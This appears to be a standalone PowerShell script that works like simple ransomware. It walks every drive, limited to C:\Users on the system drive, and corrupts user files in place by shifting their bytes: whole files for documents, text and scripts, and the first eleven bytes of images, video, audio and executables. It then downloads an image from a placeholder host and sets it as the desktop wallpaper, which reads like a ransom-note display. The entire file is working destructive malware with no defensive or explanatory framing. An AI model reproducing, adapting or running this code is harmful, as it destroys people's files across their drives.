$volumes = Get-WmiObject Win32_LogicalDisk | Select-Object -Expand DeviceID
Foreach($volume in $volumes){
	if($volume -match "C:"){
		$volume = "C:\Users"
	}
	$entrys = Get-ChildItem "$volume\" -recurse | Where-Object { !$_.PSIsContainer } | Select-Object FullName
	Foreach($entry in $entrys){
		if($entry -notmatch ".*\\windows\\.*"){
			if($entry -match ".*\.docx" -or $entry -match ".*\.txt" -or $entry -match ".*\.ps1" -or $entry -match ".*\.bat" -or $entry -match ".*\.vbs"){
				$buffer = [System.IO.File]::ReadAllBytes($entry.FullName)
				for($pos = 0; $pos -le $buffer.length - 1; $pos++) {if ($buffer[$pos] -eq 255){$buffer[$pos] = 0} else {$buffer[$pos] += 1}}
				[System.IO.File]::WriteAllBytes($entry.FullName, $buffer)
				}
			if($entry -match ".*\.pdf" -or $entry -match ".*\.avi" -or $entry -match ".*\.jpg" -or $entry -match ".*\.png" -or $entry -match ".*\.psd" -or $entry -match ".*\.mp4" -or $entry -match ".*\.mov" -or $entry -match ".*\.mp3" -or $entry -match ".*\.exe" -or $entry -match ".*\.msi"){
				$buffer = [System.IO.File]::ReadAllBytes($entry.FullName)
				for($pos = 0; $pos -le 10 -And $pos -le $buffer.length - 1; $pos++) {if ($buffer[$pos] -eq 255){$buffer[$pos] = 0} else {$buffer[$pos] += 1}}
				[System.IO.File]::WriteAllBytes($entry.FullName, $buffer)
			}
		}
	}
}

$url = 'https://example.test/image.png'
$wallpaper = "$env:USERPROFILE\wallpaper.png"
(New-Object Net.WebClient).DownloadFile($url, $wallpaper)
Set-ItemProperty -path 'HKCU:\Control Panel\Desktop\' -name wallpaper -value $wallpaper
rundll32.exe user32.dll, UpdatePerUserSystemParameters 1, True
